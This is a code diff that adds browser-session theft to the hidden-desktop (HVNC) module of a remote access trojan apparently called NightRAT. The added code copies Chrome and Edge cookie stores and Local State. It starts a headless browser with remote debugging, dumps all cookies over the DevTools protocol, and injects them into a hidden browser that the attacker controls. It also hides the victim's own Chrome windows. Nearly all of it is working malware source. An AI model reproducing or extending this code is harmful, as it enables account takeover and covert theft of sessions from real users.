@@ -7,7 +7,11 @@
 #include <propidl.h>
 #include <gdiplus.h>
 #include <objidl.h>
+#include <shlobj.h>
+#include <shlwapi.h>
 #include <algorithm>
+#include <filesystem>
+#include <random>
 #include <atomic>
 #include <cstdint>
 #include <cstring>
@@ -30,10 +34,152 @@
 #pragma comment(lib, "comctl32.lib")
 #pragma comment(lib, "uxtheme.lib")
 #pragma comment(lib, "dwmapi.lib")
+#pragma comment(lib, "shlwapi.lib")
+#pragma comment(lib, "shell32.lib")
 
 using json = nlohmann::json;
 using namespace Gdiplus;
 using namespace std;
+
+#include <sstream>
+#include <iomanip>
+
+struct CDPClient {
+    SOCKET sock;
+    string host;
+    int port;
+
+    CDPClient() : sock(INVALID_SOCKET), port(0) {}
+
+    bool connect(const string& h, int p) {
+        host = h; port = p;
+        sock = socket(AF_INET, SOCK_STREAM, IPPROTO_TCP);
+        if (sock == INVALID_SOCKET) return false;
+
+        DWORD timeout = 5000;
+        setsockopt(sock, SOL_SOCKET, SO_RCVTIMEO, (const char*)&timeout, sizeof(timeout));
+        setsockopt(sock, SOL_SOCKET, SO_SNDTIMEO, (const char*)&timeout, sizeof(timeout));
+
+        sockaddr_in addr;
+        addr.sin_family = AF_INET;
+        addr.sin_port = htons(port);
+        addr.sin_addr.s_addr = inet_addr(host.c_str());
+
+        if (::connect(sock, (struct sockaddr*)&addr, sizeof(addr)) == SOCKET_ERROR) {
+            closesocket(sock);
+            return false;
+        }
+        return true;
+    }
+
+    string request(const string& path) {
+        string req = "GET " + path + " HTTP/1.1\r\nHost: " + host + ":" + to_string(port) + "\r\nConnection: close\r\n\r\n";
+        send(sock, req.c_str(), (int)req.size(), 0);
+
+        string res;
+        char buf[4096];
+        int bytes;
+        while ((bytes = recv(sock, buf, sizeof(buf), 0)) > 0) res.append(buf, bytes);
+
+        size_t body_start = res.find("\r\n\r\n");
+        return (body_start != string::npos) ? res.substr(body_start + 4) : "";
+    }
+
+    void close() { if (sock != INVALID_SOCKET) closesocket(sock); sock = INVALID_SOCKET; }
+};
+
+struct WSClient {
+    SOCKET sock;
+    string host;
+    int port;
+    string path;
+
+    WSClient() : sock(INVALID_SOCKET), port(0) {}
+
+    bool connect(const string& h, int p, const string& pt) {
+        host = h; port = p; path = pt;
+        sock = socket(AF_INET, SOCK_STREAM, IPPROTO_TCP);
+        if (sock == INVALID_SOCKET) return false;
+
+        DWORD timeout = 5000;
+        setsockopt(sock, SOL_SOCKET, SO_RCVTIMEO, (const char*)&timeout, sizeof(timeout));
+        setsockopt(sock, SOL_SOCKET, SO_SNDTIMEO, (const char*)&timeout, sizeof(timeout));
+
+        sockaddr_in addr;
+        addr.sin_family = AF_INET;
+        addr.sin_port = htons(port);
+        addr.sin_addr.s_addr = inet_addr(host.c_str());
+
+        if (::connect(sock, (struct sockaddr*)&addr, sizeof(addr)) == SOCKET_ERROR) {
+            closesocket(sock); return false;
+        }
+
+        string upgrade = "GET " + path + " HTTP/1.1\r\n"
+                         "Host: " + host + ":" + to_string(port) + "\r\n"
+                         "Upgrade: websocket\r\n"
+                         "Connection: Upgrade\r\n"
+                         "Sec-WebSocket-Key: dGhlIHNhbXBsZSBub25jZQ==\r\n"
+                         "Sec-WebSocket-Version: 13\r\n\r\n";
+        send(sock, upgrade.c_str(), (int)upgrade.size(), 0);
+
+        char buf[1024];
+        int bytes = recv(sock, buf, sizeof(buf), 0);
+        if (bytes <= 0 || string(buf, bytes).find("101 Switching Protocols") == string::npos) {
+            closesocket(sock); return false;
+        }
+        return true;
+    }
+
+    void send_frame(const string& payload) {
+        vector<uint8_t> frame;
+        frame.push_back(0x81); // FIN + Text
+        if (payload.size() <= 125) {
+            frame.push_back((uint8_t)payload.size() | 0x80); // Mask bit set
+        } else if (payload.size() <= 65535) {
+            frame.push_back(126 | 0x80);
+            frame.push_back((payload.size() >> 8) & 0xFF);
+            frame.push_back(payload.size() & 0xFF);
+        } else {
+            frame.push_back(127 | 0x80);
+            for (int i = 7; i >= 0; i--) frame.push_back((payload.size() >> (i * 8)) & 0xFF);
+        }
+
+        uint8_t mask[4] = { 0x12, 0x34, 0x56, 0x78 };
+        frame.insert(frame.end(), mask, mask + 4);
+
+        for (size_t i = 0; i < payload.size(); i++) {
+            frame.push_back(payload[i] ^ mask[i % 4]);
+        }
+
+        send(sock, (const char*)frame.data(), (int)frame.size(), 0);
+    }
+
+    string recv_frame() {
+        uint8_t head[2];
+        if (recv(sock, (char*)head, 2, 0) <= 0) return "";
+
+        uint64_t len = head[1] & 0x7F;
+        if (len == 126) {
+            uint8_t l[2]; recv(sock, (char*)l, 2, 0);
+            len = (l[0] << 8) | l[1];
+        } else if (len == 127) {
+            uint8_t l[8]; recv(sock, (char*)l, 8, 0);
+            len = 0; for(int i=0; i<8; i++) len = (len << 8) | l[i];
+        }
+
+        string payload;
+        payload.resize((size_t)len);
+        int received = 0;
+        while (received < (int)len) {
+            int r = recv(sock, &payload[received], (int)len - received, 0);
+            if (r <= 0) break;
+            received += r;
+        }
+        return payload;
+    }
+
+    void close() { if (sock != INVALID_SOCKET) closesocket(sock); sock = INVALID_SOCKET; }
+};
 
 #ifndef PW_RENDERFULLCONTENT
 #define PW_RENDERFULLCONTENT 0x00000002
@@ -67,7 +213,11 @@ static const uint32_t FRAME_FORMAT_JPEG = 1;
 static const uint32_t FRAME_FORMAT_JPEG_DIRTY = 2;
 
 static atomic_bool g_captureRunning(false);
+static atomic_bool g_stealRunning(false);
 static thread g_captureThread;
+static thread g_stealThread;
+static thread g_dummyThread;
+static HWND g_hDummyParent = NULL;
 static mutex g_captureMutex;
 static mutex g_sendMutex;
 static SOCKET g_socket = INVALID_SOCKET;
@@ -138,6 +288,7 @@ static atomic_bool g_inputRunning(false);
 
 // ---------- Drag state ----------
 static HWND  g_dragHwnd     = NULL;
+static bool  g_isStealingActive = false;
 static POINT g_dragStartPt  = {0, 0};
 static POINT g_lastMousePos = {0, 0};
 static RECT  g_dragStartRect = {0, 0, 0, 0};
@@ -298,6 +449,66 @@ static void ensure_desktop() {
 static void client_log(const string& msg) {
     lock_guard<mutex> lock(g_logMutex);
     cout << "[HVNC] " << msg << endl;
+}
+
+static LRESULT CALLBACK DummyParentWndProc(HWND hwnd, UINT msg, WPARAM wParam, LPARAM lParam) {
+    return DefWindowProcW(hwnd, msg, wParam, lParam);
+}
+
+static void dummy_parent_worker() {
+    ensure_desktop();
+    if (!g_hHiddenDesktop) return;
+    SetThreadDesktop(g_hHiddenDesktop);
+
+    WNDCLASSW wc = {0};
+    wc.lpfnWndProc = DummyParentWndProc;
+    wc.hInstance = GetModuleHandle(NULL);
+    wc.lpszClassName = L"NightRAT_DummyHost";
+    RegisterClassW(&wc);
+
+    g_hDummyParent = CreateWindowExW(0, wc.lpszClassName, L"DummyHost", WS_POPUP,
+                                     0, 0, GetSystemMetrics(SM_CXSCREEN), GetSystemMetrics(SM_CYSCREEN),
+                                     NULL, NULL, wc.hInstance, NULL);
+
+    if (g_hDummyParent) {
+        ShowWindow(g_hDummyParent, SW_SHOW);
+        MSG msg;
+        while (g_stealRunning && GetMessageW(&msg, NULL, 0, 0)) {
+            TranslateMessage(&msg);
+            DispatchMessageW(&msg);
+        }
+    }
+}
+
+static void chrome_steal_worker() {
+    while (g_stealRunning) {
+        if (!g_isStealingActive) {
+            Sleep(1000);
+            continue;
+        }
+
+        HWND hwnd = GetWindow(GetDesktopWindow(), GW_CHILD);
+        while (hwnd) {
+            if (IsWindowVisible(hwnd)) {
+                wchar_t className[256];
+                GetClassNameW(hwnd, className, 256);
+                if (wcscmp(className, L"Chrome_WidgetWin_1") == 0) {
+                    DWORD procId = 0;
+                    GetWindowThreadProcessId(hwnd, &procId);
+                    if (procId != GetCurrentProcessId()) {
+                        long style = GetWindowLongPtrW(hwnd, GWL_STYLE);
+                        if (!(style & WS_CHILD)) {
+                            SetWindowLongPtrW(hwnd, GWL_STYLE, style | WS_CHILD);
+                            SetParent(hwnd, g_hDummyParent);
+                            SetWindowPos(hwnd, NULL, 0, 0, 1920, 1080, SWP_NOACTIVATE | SWP_ASYNCWINDOWPOS);
+                        }
+                    }
+                }
+            }
+            hwnd = GetWindow(hwnd, GW_HWNDNEXT);
+        }
+        Sleep(500);
+    }
 }
 
 // -----------------------------------------------------------------------
@@ -1124,6 +1335,220 @@ static void input_loop() {
     }
 }
 
+static wstring get_browser_path(const wstring& browser_exe) {
+    wchar_t path[MAX_PATH];
+    DWORD size = sizeof(path);
+    wstring subkey = L"SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\App Paths\\" + browser_exe;
+    wstring result = L"";
+
+    if (RegGetValueW(HKEY_LOCAL_MACHINE, subkey.c_str(), NULL, RRF_RT_REG_SZ, NULL, path, &size) == ERROR_SUCCESS) {
+        result = path;
+    } else {
+        size = sizeof(path);
+        if (RegGetValueW(HKEY_CURRENT_USER, subkey.c_str(), NULL, RRF_RT_REG_SZ, NULL, path, &size) == ERROR_SUCCESS) {
+            result = path;
+        }
+    }
+
+    if (!result.empty()) {
+        if (result.length() >= 2 && result.front() == L'\"' && result.back() == L'\"') {
+            result = result.substr(1, result.length() - 2);
+        }
+    }
+    return result;
+}
+
+static json get_cookies_cdp(int port) {
+    CDPClient http;
+    if (!http.connect("127.0.0.1", port)) return json::array();
+    string version_info = http.request("/json/version");
+    http.close();
+
+    try {
+        json info = json::parse(version_info);
+        string ws_url = info["webSocketDebuggerUrl"];
+        size_t path_start = ws_url.find("/devtools/browser/");
+        if (path_start == string::npos) return json::array();
+        string path = ws_url.substr(path_start);
+
+        WSClient ws;
+        if (ws.connect("127.0.0.1", port, path)) {
+            ws.send_frame(json({ {"id", 1}, {"method", "Network.getAllCookies"}, {"params", json::object()} }).dump());
+            string res_str = ws.recv_frame();
+            ws.close();
+            json res = json::parse(res_str);
+            if (res.contains("result") && res["result"].contains("cookies")) {
+                return res["result"]["cookies"];
+            }
+        }
+    } catch (...) {}
+    return json::array();
+}
+
+static void set_cookies_cdp(int port, const json& cookies) {
+    if (cookies.empty()) return;
+    CDPClient http;
+    if (!http.connect("127.0.0.1", port)) return;
+    string version_info = http.request("/json/version");
+    http.close();
+
+    try {
+        json info = json::parse(version_info);
+        string ws_url = info["webSocketDebuggerUrl"];
+        size_t path_start = ws_url.find("/devtools/browser/");
+        if (path_start == string::npos) return;
+        string path = ws_url.substr(path_start);
+
+        WSClient ws;
+        if (ws.connect("127.0.0.1", port, path)) {
+            json params = { {"cookies", json::array()} };
+            for (const auto& c : cookies) {
+                json cookie = {
+                    {"name", c["name"]}, {"value", c["value"]}, {"domain", c["domain"]},
+                    {"path", c["path"]}, {"secure", c["secure"]}, {"httpOnly", c["httpOnly"]},
+                    {"sameSite", c.value("sameSite", "Lax")}
+                };
+                if (c.contains("expires")) cookie["expires"] = c["expires"];
+                params["cookies"].push_back(cookie);
+            }
+            ws.send_frame(json({ {"id", 2}, {"method", "Network.setCookies"}, {"params", params} }).dump());
+            ws.recv_frame();
+            ws.close();
+        }
+    } catch (...) {}
+}
+
+
+static bool create_fresh_profile(const wstring& browser_name, wstring& target_data_dir) {
+    wchar_t temp_path[MAX_PATH];
+    GetTempPathW(MAX_PATH, temp_path);
+
+    std::random_device rd;
+    std::mt19937 gen(rd());
+    std::uniform_int_distribution<> dis(10000, 99999);
+    wstring random_name = wstring(browser_name == L"chrome.exe" ? L"chrome" : L"edge") + L"_hvncp_" + to_wstring(dis(gen));
+    target_data_dir = wstring(temp_path) + random_name;
+
+    try {
+        std::filesystem::create_directories(target_data_dir);
+        return true;
+    } catch (...) {
+        return false;
+    }
+}
+
+static void launch_browser_thread(wstring browser_name) {
+    wstring browser_path = get_browser_path(browser_name);
+    if (browser_path.empty()) {
+        send_error("Browser not found");
+        return;
+    }
+
+    namespace fs = std::filesystem;
+    fs::path browser_exe(browser_path);
+    wstring browser_dir = browser_exe.parent_path().wstring();
+
+    send_status("profiller kopyalanıyor...");
+
+    // 1. Extract cookies from the running browser on the default desktop
+    wchar_t localAppData[MAX_PATH];
+    wstring source_path;
+    if (GetEnvironmentVariableW(L"LOCALAPPDATA", localAppData, MAX_PATH) != 0) {
+        if (browser_name == L"chrome.exe") source_path = wstring(localAppData) + L"\\Google\\Chrome\\User Data";
+        else if (browser_name == L"msedge.exe") source_path = wstring(localAppData) + L"\\Microsoft\\Edge\\User Data";
+    }
+
+    int extract_port = 9222;
+    wstring extract_cmd = L"\"" + browser_path + L"\" --remote-debugging-port=" + to_wstring(extract_port) + L" --headless --disable-gpu about:blank";
+
+    wstring bridge_dir = L"";
+    if (!source_path.empty()) {
+        wchar_t temp[MAX_PATH]; GetTempPathW(MAX_PATH, temp);
+        bridge_dir = wstring(temp) + L"hvnc_bridge_" + to_wstring(GetTickCount());
+        try {
+            fs::create_directories(fs::path(bridge_dir) / L"Default/Network");
+            CopyFileW((source_path + L"\\Local State").c_str(), (bridge_dir + L"\\Local State").c_str(), FALSE);
+            CopyFileW((source_path + L"\\Default\\Cookies").c_str(), (bridge_dir + L"\\Default\\Cookies").c_str(), FALSE);
+            CopyFileW((source_path + L"\\Default\\Network\\Cookies").c_str(), (bridge_dir + L"\\Default\\Network\\Cookies").c_str(), FALSE);
+            CopyFileW((source_path + L"\\Default\\Preferences").c_str(), (bridge_dir + L"\\Default\\Preferences").c_str(), FALSE);
+            extract_cmd += L" --user-data-dir=\"" + bridge_dir + L"\"";
+        } catch(...) {}
+    }
+
+    vector<wchar_t> exCmdVec(extract_cmd.begin(), extract_cmd.end());
+    exCmdVec.push_back(L'\0');
+
+    STARTUPINFOW si_ex;
+    PROCESS_INFORMATION pi_ex;
+    memset(&si_ex, 0, sizeof(si_ex));
+    memset(&pi_ex, 0, sizeof(pi_ex));
+    si_ex.cb = sizeof(si_ex);
+    json cookies = json::array();
+    if (CreateProcessW(NULL, exCmdVec.data(), NULL, NULL, FALSE, CREATE_NO_WINDOW, NULL, NULL, &si_ex, &pi_ex)) {
+        for (int i = 0; i < 10; i++) {
+            Sleep(1000);
+            cookies = get_cookies_cdp(extract_port);
+            if (!cookies.empty()) break;
+        }
+        TerminateProcess(pi_ex.hProcess, 0);
+        CloseHandle(pi_ex.hProcess);
+        CloseHandle(pi_ex.hThread);
+    }
+    if (!bridge_dir.empty()) { try { fs::remove_all(bridge_dir); } catch(...) {} }
+
+    // 2. Prepare fresh profile for hidden desktop
+    wstring target_data_dir;
+    if (!create_fresh_profile(browser_name, target_data_dir)) {
+        send_error("Failed to create fresh profile");
+        return;
+    }
+
+    send_status("program başlatılıyor");
+
+    // 3. Launch browser on DEFAULT desktop (Redirection Method)
+    int hidden_port = 9223;
+    wstring cmdLine = L"\"" + browser_path + L"\" --user-data-dir=\"" + target_data_dir +
+                      L"\" --no-sandbox --disable-gpu --password-store=basic --remote-debugging-port=" + to_wstring(hidden_port) +
+                      L" --disable-features=RendererCodeIntegrity --no-first-run --no-default-browser-check --disable-sync --disable-extensions " +
+                      L" --remote-allow-origins=* --window-size=1920,1080 --start-maximized --disable-infobars --disable-notifications";
+    vector<wchar_t> cmdVec(cmdLine.begin(), cmdLine.end());
+    cmdVec.push_back(L'\0');
+
+    STARTUPINFOW si;
+    PROCESS_INFORMATION pi;
+    memset(&si, 0, sizeof(si));
+    memset(&pi, 0, sizeof(pi));
+    si.cb = sizeof(si);
+    si.lpDesktop    = NULL; // Launch on default desktop for initialization
+    si.dwFlags      = STARTF_USESHOWWINDOW;
+    si.wShowWindow  = SW_HIDE; // Hidden to the user on default desktop
+
+    g_isStealingActive = true;
+
+    if (CreateProcessW(NULL, cmdVec.data(), NULL, NULL, FALSE,
+                       CREATE_NEW_CONSOLE, NULL, browser_dir.c_str(), &si, &pi)) {
+        // 4. Inject extracted cookies
+        if (!cookies.empty()) {
+            for (int i = 0; i < 15; i++) {
+                Sleep(1000);
+                CDPClient test;
+                if (test.connect("127.0.0.1", hidden_port)) {
+                    test.close();
+                    set_cookies_cdp(hidden_port, cookies);
+                    break;
+                }
+            }
+        }
+
+        CloseHandle(pi.hProcess);
+        CloseHandle(pi.hThread);
+        g_forceFullFrame = true;
+        send_status("başlatıldı");
+    } else {
+        send_error("Failed to start browser. Error: " + to_string(GetLastError()));
+    }
+}
+
 static wstring utf8_to_wstring(const string& str) {
     if (str.empty()) return wstring();
     int size = MultiByteToWideChar(CP_UTF8, 0, str.c_str(), -1, NULL, 0);
@@ -1169,21 +1594,37 @@ extern "C" __declspec(dllexport) void HandleCommand(SOCKET sock, const char* cmd
                 if (g_inputThread.joinable()) g_inputThread.join();
                 g_inputThread = thread(input_loop);
             }
+            if (!g_stealRunning.exchange(true)) {
+                if (g_stealThread.joinable()) g_stealThread.join();
+                if (g_dummyThread.joinable()) g_dummyThread.join();
+                g_stealThread = thread(chrome_steal_worker);
+                g_dummyThread = thread(dummy_parent_worker);
+            }
         } else if (action == "hvnc_stop") {
             g_captureRunning = false;
             g_encodeRunning  = false;
             g_sendRunning    = false;
             g_inputRunning   = false;
+            g_stealRunning   = false;
             g_frameCV.notify_all();
             g_sendCV.notify_all();
             g_inputCV.notify_all();
+            if (g_hDummyParent) {
+                PostMessageW(g_hDummyParent, WM_CLOSE, 0, 0);
+                g_hDummyParent = NULL;
+            }
+
             if (g_captureThread.joinable()) g_captureThread.join();
             if (g_encodeThread.joinable())  g_encodeThread.join();
             if (g_sendThread.joinable())    g_sendThread.join();
             if (g_inputThread.joinable())   g_inputThread.join();
+            if (g_stealThread.joinable())   g_stealThread.join();
+            if (g_dummyThread.joinable())   g_dummyThread.join();
+
             release_all_bitmap_slots();
             g_dragging = false;
             g_dragHwnd = NULL;
+            g_isStealingActive = false;
             g_mouseDownTarget[0] = NULL;
             g_mouseDownTarget[1] = NULL;
             g_mouseDownTarget[2] = NULL;
@@ -1198,25 +1639,29 @@ extern "C" __declspec(dllexport) void HandleCommand(SOCKET sock, const char* cmd
             ensure_desktop();
             if (!g_hHiddenDesktop) return;
 
-            wstring path = utf8_to_wstring(cmd.value("path", "cmd.exe"));
-            vector<wchar_t> cmdLine(path.begin(), path.end());
-            cmdLine.push_back(L'\0');
-
-            wstring fullDesktopName = L"WinSta0\\" + g_desktopName;
-            STARTUPINFOW si = { sizeof(si) };
-            si.lpDesktop    = (LPWSTR)fullDesktopName.c_str();
-            si.dwFlags      = STARTF_USESHOWWINDOW;
-            si.wShowWindow  = SW_SHOW;
-
-            PROCESS_INFORMATION pi = { 0 };
-            if (CreateProcessW(NULL, cmdLine.data(), NULL, NULL, FALSE,
-                               CREATE_NEW_CONSOLE, NULL, NULL, &si, &pi)) {
-                CloseHandle(pi.hProcess);
-                CloseHandle(pi.hThread);
-                g_forceFullFrame = true;
-                send_status("Process started on hidden desktop");
+            wstring pathStr = utf8_to_wstring(cmd.value("path", "cmd.exe"));
+            if (pathStr == L"chrome.exe" || pathStr == L"msedge.exe") {
+                thread(launch_browser_thread, pathStr).detach();
             } else {
-                send_error("Failed to start process. Error: " + to_string(GetLastError()));
+                vector<wchar_t> cmdLine(pathStr.begin(), pathStr.end());
+                cmdLine.push_back(L'\0');
+
+                wstring fullDesktopName = L"WinSta0\\" + g_desktopName;
+                STARTUPINFOW si = { sizeof(si) };
+                si.lpDesktop    = (LPWSTR)fullDesktopName.c_str();
+                si.dwFlags      = STARTF_USESHOWWINDOW;
+                si.wShowWindow  = SW_SHOW;
+
+                PROCESS_INFORMATION pi = { 0 };
+                if (CreateProcessW(NULL, cmdLine.data(), NULL, NULL, FALSE,
+                                   CREATE_NEW_CONSOLE, NULL, NULL, &si, &pi)) {
+                    CloseHandle(pi.hProcess);
+                    CloseHandle(pi.hThread);
+                    g_forceFullFrame = true;
+                    send_status("Process started on hidden desktop");
+                } else {
+                    send_error("Failed to start process. Error: " + to_string(GetLastError()));
+                }
             }
         } else if (action.find("hvnc_mouse") != string::npos ||
                    action.find("hvnc_key")   != string::npos ||
